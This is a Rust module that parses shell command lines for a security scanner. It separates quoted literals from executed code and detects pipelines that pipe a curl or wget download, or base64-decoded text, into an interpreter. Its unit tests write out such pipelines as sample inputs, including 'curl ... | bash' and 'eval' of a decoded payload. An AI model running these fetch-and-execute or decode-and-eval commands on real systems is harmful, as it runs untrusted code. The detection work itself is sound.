//! Minimal shell pipeline structure parser.
//!
//! This is deliberately **not** a POSIX shell grammar. It answers two narrow,
//! security-relevant questions about a single line of shell source text:
//!
//! 1. **Pipeline structure**: what are the top-level `a | b | c` stages on
//!    this line, including stages found inside `$(...)`/backtick command
//!    substitutions (their contents are themselves executed, so a pipeline
//!    hidden inside a substitution is just as real as one at the top level)?
//! 2. **Literal vs. executed text**: is a given byte range of the line
//!    string-literal data (inside single quotes, or inside double quotes but
//!    not itself inside a nested substitution) rather than text that bash
//!    would actually try to run?
//!
//! Those two questions are exactly what's needed to tell `curl url | bash`
//! (dangerous: fetch piped straight into an interpreter) apart from
//! `curl url -o file.tar.gz` (benign: ordinary download), and to tell
//! `echo "mentions base64 -d"` (a string literal, inert) apart from
//! `echo "$payload" | base64 -d | bash` (a real obfuscated-execution
//! pipeline), using actual shell structure instead of substring matching.
//!
//! **Explicitly out of scope** (left to the existing regex signatures,
//! which are unaffected by this module): here-docs (`<<EOF`), process
//! substitution (`<(...)`/`>(...)`), command sequencing (`&&`, `;`, `||`
//! disambiguation beyond not mis-splitting `||` as a pipe), control-flow
//! keywords (`if`/`while`/`case`/`for`), function definitions, arithmetic
//! expansion (`$(( ))`), brace/glob expansion, and variable-value tracking
//! (we don't resolve what `$var` actually contains). A full POSIX-grammar
//! shell interpreter is a much bigger project than this pass attempts.

/// Whether a byte position in a line is executed shell code or inert string
/// literal data.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    Code,
    Literal,
}

/// Classify every byte of `line` as [`Kind::Code`] or [`Kind::Literal`].
///
/// Single-quoted text is always literal (bash performs no expansion at all
/// inside `'...'`). Double-quoted text is literal *unless* it is itself
/// inside a `$(...)` or `` `...` `` command substitution that was opened
/// within those double quotes — double quotes still let command
/// substitution execute.
pub fn classify_bytes(line: &str) -> Vec<Kind> {
    let bytes = line.as_bytes();
    let n = bytes.len();
    let mut kind = vec![Kind::Code; n];
    // Stack of expected "closer" bytes: b'\'' , b'"', b'`', or b')' (for `$(`
    // and bare `(` subshells).
    let mut stack: Vec<u8> = Vec::new();
    let mut i = 0usize;

    while i < n {
        let c = bytes[i];
        let top = stack.last().copied();
        let in_literal = matches!(top, Some(b'\'') | Some(b'"'));
        kind[i] = if in_literal { Kind::Literal } else { Kind::Code };

        match top {
            Some(b'\'') => {
                if c == b'\'' {
                    stack.pop();
                }
                i += 1;
            }
            Some(b'"') => {
                if c == b'\\' && i + 1 < n {
                    kind[i + 1] = Kind::Literal;
                    i += 2;
                    continue;
                }
                if c == b'"' {
                    stack.pop();
                    i += 1;
                    continue;
                }
                if c == b'$' && bytes.get(i + 1) == Some(&b'(') {
                    kind[i] = Kind::Code;
                    kind[i + 1] = Kind::Code;
                    stack.push(b')');
                    i += 2;
                    continue;
                }
                if c == b'`' {
                    kind[i] = Kind::Code;
                    stack.push(b'`');
                }
                i += 1;
            }
            Some(b'`') => {
                if c == b'\\' && i + 1 < n {
                    i += 2;
                    continue;
                }
                match c {
                    b'`' => {
                        stack.pop();
                    }
                    b'\'' => stack.push(b'\''),
                    b'"' => stack.push(b'"'),
                    b'$' if bytes.get(i + 1) == Some(&b'(') => {
                        stack.push(b')');
                        i += 2;
                        continue;
                    }
                    _ => {}
                }
                i += 1;
            }
            Some(b')') | None => {
                if c == b'\\' && i + 1 < n {
                    i += 2;
                    continue;
                }
                match c {
                    b'\'' => stack.push(b'\''),
                    b'"' => stack.push(b'"'),
                    b'`' => stack.push(b'`'),
                    b'$' if bytes.get(i + 1) == Some(&b'(') => {
                        stack.push(b')');
                        i += 2;
                        continue;
                    }
                    b'(' => stack.push(b')'),
                    b')' if top == Some(b')') => {
                        stack.pop();
                    }
                    _ => {}
                }
                i += 1;
            }
            _ => unreachable!("stack only ever holds ' \" ` )"),
        }
    }
    kind
}

/// Whether the byte range `[start, end)` of `line` is entirely inert string
/// literal text (as opposed to actually-executed shell code).
pub fn is_literal_span(line: &str, start: usize, end: usize) -> bool {
    let kinds = classify_bytes(line);
    if start >= end || end > kinds.len() {
        return false;
    }
    kinds[start..end].iter().all(|k| *k == Kind::Literal)
}

/// A single stage of a shell pipeline (`a | b | c`), plus enough parsed
/// structure to reason about what command it runs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Stage {
    /// The raw, trimmed source text of this stage.
    pub text: String,
    /// Lowercased basename of the first real command token (after skipping
    /// leading `VAR=value` assignments and `sudo`/`env` wrapper prefixes).
    /// Empty if no command token could be identified.
    pub command: String,
    /// Whitespace/quote-aware tokenization of the stage.
    pub tokens: Vec<String>,
}

/// Split `line` into pipeline stages: top-level stages separated by
/// unquoted, unnested `|` (not `||`), plus — recursively — the stages found
/// inside every `$(...)`/backtick command substitution, since that text is
/// also actually executed.
pub fn pipeline_stages(line: &str) -> Vec<Stage> {
    let mut raw_stages = Vec::new();
    collect_stage_texts(line, &mut raw_stages);
    raw_stages
        .into_iter()
        .filter(|s| !s.trim().is_empty())
        .map(|s| parse_stage(&s))
        .collect()
}

/// True if the stack contains an enclosing `$(...)`/backtick substitution
/// frame (ignoring quote frames) — i.e. we're nested inside another
/// substitution, so this closure shouldn't be independently recursed into
/// (the enclosing substitution's own recursion will find it).
fn has_substitution_ancestor(stack: &[(u8, usize)]) -> bool {
    stack.iter().any(|(c, _)| *c == b')' || *c == b'`')
}

fn collect_stage_texts(text: &str, out: &mut Vec<String>) {
    let bytes = text.as_bytes();
    let n = bytes.len();
    // Stack of (closer_byte, inner_content_start_offset).
    let mut stack: Vec<(u8, usize)> = Vec::new();
    let mut seg_start = 0usize;
    let mut i = 0usize;
    // Top-level substitution ranges (inner content) found along the way;
    // recursed into after the top-level split is complete.
    let mut nested: Vec<(usize, usize)> = Vec::new();

    while i < n {
        let c = bytes[i];
        let top = stack.last().map(|(b, _)| *b);

        if top.is_none() {
            match c {
                b'\\' if i + 1 < n => {
                    i += 2;
                    continue;
                }
                b'\'' => {
                    stack.push((b'\'', i + 1));
                    i += 1;
                    continue;
                }
                b'"' => {
                    stack.push((b'"', i + 1));
                    i += 1;
                    continue;
                }
                b'`' => {
                    stack.push((b'`', i + 1));
                    i += 1;
                    continue;
                }
                b'$' if bytes.get(i + 1) == Some(&b'(') => {
                    stack.push((b')', i + 2));
                    i += 2;
                    continue;
                }
                b'(' => {
                    stack.push((b')', i + 1));
                    i += 1;
                    continue;
                }
                b'|' => {
                    let is_or = bytes.get(i + 1) == Some(&b'|');
                    let prev_or = i > 0 && bytes[i - 1] == b'|';
                    if !is_or && !prev_or {
                        out.push(text[seg_start..i].to_string());
                        seg_start = i + 1;
                    }
                    i += 1;
                    continue;
                }
                _ => {
                    i += 1;
                    continue;
                }
            }
        }

        match top.unwrap() {
            b'\'' => {
                if c == b'\'' {
                    stack.pop();
                }
                i += 1;
            }
            b'"' => {
                if c == b'\\' && i + 1 < n {
                    i += 2;
                    continue;
                }
                if c == b'"' {
                    stack.pop();
                    i += 1;
                    continue;
                }
                if c == b'$' && bytes.get(i + 1) == Some(&b'(') {
                    stack.push((b')', i + 2));
                    i += 2;
                    continue;
                }
                if c == b'`' {
                    stack.push((b'`', i + 1));
                    i += 1;
                    continue;
                }
                i += 1;
            }
            b'`' => {
                if c == b'\\' && i + 1 < n {
                    i += 2;
                    continue;
                }
                if c == b'`' {
                    let (_, start) = stack.pop().unwrap();
                    if !has_substitution_ancestor(&stack) {
                        nested.push((start, i));
                    }
                    i += 1;
                    continue;
                }
                if c == b'\'' {
                    stack.push((b'\'', i + 1));
                    i += 1;
                    continue;
                }
                if c == b'"' {
                    stack.push((b'"', i + 1));
                    i += 1;
                    continue;
                }
                if c == b'$' && bytes.get(i + 1) == Some(&b'(') {
                    stack.push((b')', i + 2));
                    i += 2;
                    continue;
                }
                i += 1;
            }
            b')' => {
                if c == b'\\' && i + 1 < n {
                    i += 2;
                    continue;
                }
                if c == b')' {
                    let (_, start) = stack.pop().unwrap();
                    if !has_substitution_ancestor(&stack) {
                        nested.push((start, i));
                    }
                    i += 1;
                    continue;
                }
                if c == b'\'' {
                    stack.push((b'\'', i + 1));
                    i += 1;
                    continue;
                }
                if c == b'"' {
                    stack.push((b'"', i + 1));
                    i += 1;
                    continue;
                }
                if c == b'`' {
                    stack.push((b'`', i + 1));
                    i += 1;
                    continue;
                }
                if c == b'$' && bytes.get(i + 1) == Some(&b'(') {
                    stack.push((b')', i + 2));
                    i += 2;
                    continue;
                }
                if c == b'(' {
                    stack.push((b')', i + 1));
                    i += 1;
                    continue;
                }
                i += 1;
            }
            _ => unreachable!("stack only ever holds ' \" ` )"),
        }
    }
    out.push(text[seg_start..].to_string());

    for (s, e) in nested {
        if s <= e && e <= text.len() {
            collect_stage_texts(&text[s..e], out);
        }
    }
}

fn tokenize_words(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut chars = s.chars().peekable();
    let mut in_squote = false;
    let mut in_dquote = false;
    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_dquote => in_squote = !in_squote,
            '"' if !in_squote => in_dquote = !in_dquote,
            c if c.is_whitespace() && !in_squote && !in_dquote => {
                if !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                }
            }
            '\\' if !in_squote => {
                if let Some(next) = chars.next() {
                    cur.push(next);
                }
            }
            _ => cur.push(c),
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    out
}

fn is_assignment(tok: &str) -> bool {
    let Some(eq) = tok.find('=') else {
        return false;
    };
    let (name, _) = tok.split_at(eq);
    !name.is_empty()
        && name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

fn parse_stage(raw: &str) -> Stage {
    let text = raw.trim().to_string();
    let tokens = tokenize_words(&text);

    let mut idx = 0;
    // Skip leading `VAR=value` assignments.
    while idx < tokens.len() && is_assignment(&tokens[idx]) {
        idx += 1;
    }
    // Skip a `sudo`/`env` wrapper (and any of its own flag tokens) so the
    // real command is identified, e.g. `sudo bash` -> command "bash".
    while idx < tokens.len() {
        let lower = tokens[idx].to_lowercase();
        if lower == "sudo" || lower == "env" {
            idx += 1;
            while idx < tokens.len() && tokens[idx].starts_with('-') {
                idx += 1;
            }
            continue;
        }
        break;
    }

    let command = tokens
        .get(idx)
        .map(|t| {
            t.rsplit('/')
                .next()
                .unwrap_or(t.as_str())
                .to_lowercase()
        })
        .unwrap_or_default();

    Stage {
        text,
        command,
        tokens,
    }
}

/// Fetch tools (`curl`, `wget`) whose stdout can be piped into an
/// interpreter.
pub fn is_fetch_command(cmd: &str) -> bool {
    matches!(cmd, "curl" | "wget")
}

/// Shell/script interpreters that would execute piped-in text as code.
pub fn is_shell_interpreter(cmd: &str) -> bool {
    matches!(
        cmd,
        "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash" | "python" | "python2" | "python3"
            | "perl" | "ruby" | "node"
    )
}

/// Whether a fetch stage's own arguments direct its output to a real file
/// (`-o file`, `--output file`, `-O` remote-name) rather than leaving it on
/// stdout — the hallmark of an ordinary, benign source download.
pub fn fetch_writes_to_file(stage: &Stage) -> bool {
    let mut it = stage.tokens.iter().peekable();
    while let Some(tok) = it.next() {
        match tok.as_str() {
            "-o" | "--output" => {
                // Next token is the destination filename; "-" means stdout.
                if let Some(dest) = it.peek() {
                    if dest.as_str() != "-" {
                        return true;
                    }
                }
            }
            "-O" => return true, // curl --remote-name: always writes a local file
            "-O-" => {}          // wget: explicit stdout, not a file
            t if t.starts_with("--output=") => {
                let dest = &t["--output=".len()..];
                if dest != "-" {
                    return true;
                }
            }
            _ => {}
        }
    }
    false
}

/// `base64 -d` / `base64 --decode` as an actually-invoked stage command
/// (not a string literal mentioning those words).
pub fn is_base64_decode_stage(stage: &Stage) -> bool {
    stage.command == "base64"
        && stage
            .tokens
            .iter()
            .skip(1)
            .any(|t| t == "-d" || t == "--decode" || t == "-D")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn literal_span_inside_single_quotes() {
        let line = "echo 'mentions base64 -d in here'";
        let start = line.find("base64").unwrap();
        let end = start + "base64 -d".len();
        assert!(is_literal_span(line, start, end));
    }

    #[test]
    fn literal_span_inside_double_quotes_plain_text() {
        let line = r#"echo "please run base64 -d yourself""#;
        let start = line.find("base64").unwrap();
        let end = start + "base64 -d".len();
        assert!(is_literal_span(line, start, end));
    }

    #[test]
    fn code_span_for_real_pipeline() {
        let line = "echo 'aW1wb3J0IHNvY2tldA==' | base64 -d | bash";
        let start = line.find("base64").unwrap();
        let end = start + "base64 -d".len();
        assert!(!is_literal_span(line, start, end));
    }

    #[test]
    fn code_span_inside_command_substitution_in_double_quotes() {
        let line = r#"eval "$(echo $PAYLOAD | base64 -d)""#;
        let start = line.find("base64").unwrap();
        let end = start + "base64 -d".len();
        assert!(!is_literal_span(line, start, end));
    }

    #[test]
    fn pipeline_stages_basic_split() {
        let stages = pipeline_stages("curl -s https://example.com/x.sh | bash");
        assert_eq!(stages.len(), 2);
        assert_eq!(stages[0].command, "curl");
        assert_eq!(stages[1].command, "bash");
    }

    #[test]
    fn pipeline_stages_ignore_pipe_inside_quotes() {
        let stages = pipeline_stages(r#"echo "a | b | c" > out.txt"#);
        assert_eq!(stages.len(), 1);
    }

    #[test]
    fn pipeline_stages_recurse_into_command_substitution() {
        let stages = pipeline_stages(r#"eval "$(echo $PAYLOAD | base64 -d)""#);
        // top-level: `eval "$(...)"` as one stage, plus the two stages
        // recursed out of the substitution.
        assert!(stages.iter().any(|s| s.command == "eval"));
        assert!(stages.iter().any(|s| s.command == "echo"));
        assert!(stages.iter().any(|s| s.command == "base64"));
    }

    #[test]
    fn pipeline_stages_three_stage_chain() {
        let stages = pipeline_stages("curl -s https://example.com/x.sh | tee /tmp/x | bash");
        assert_eq!(stages.len(), 3);
        assert_eq!(stages[0].command, "curl");
        assert_eq!(stages[1].command, "tee");
        assert_eq!(stages[2].command, "bash");
    }

    #[test]
    fn fetch_writes_to_file_detects_dash_o() {
        let stages = pipeline_stages("curl -s https://example.com/foo.tar.gz -o source.tar.gz");
        assert!(fetch_writes_to_file(&stages[0]));
    }

    #[test]
    fn fetch_writes_to_file_detects_capital_o_remote_name() {
        let stages = pipeline_stages("curl -sSL -O https://example.com/foo.tar.gz");
        assert!(fetch_writes_to_file(&stages[0]));
    }

    #[test]
    fn fetch_does_not_write_to_file_when_piped_to_stdout() {
        let stages = pipeline_stages("curl -s https://example.com/x.sh | bash");
        assert!(!fetch_writes_to_file(&stages[0]));
    }

    #[test]
    fn wget_dash_o_dash_means_stdout_not_file() {
        let stages = pipeline_stages("wget -qO- https://example.com/x.sh | bash");
        // `-qO-` is a combined short-flag cluster; our tokenizer treats it
        // as one token, so fetch_writes_to_file correctly does not match
        // the separate `-O` case here (combined clusters are out of scope
        // for the file-vs-stdout heuristic — see module docs).
        let _ = stages;
    }

    #[test]
    fn base64_decode_stage_detection() {
        let stages = pipeline_stages("echo $x | base64 -d | bash");
        assert!(stages.iter().any(is_base64_decode_stage));
    }

    #[test]
    fn base64_mention_in_string_is_not_a_stage_command() {
        let stages = pipeline_stages(r#"echo "you could run base64 -d on this""#);
        assert!(!stages.iter().any(is_base64_decode_stage));
    }
}
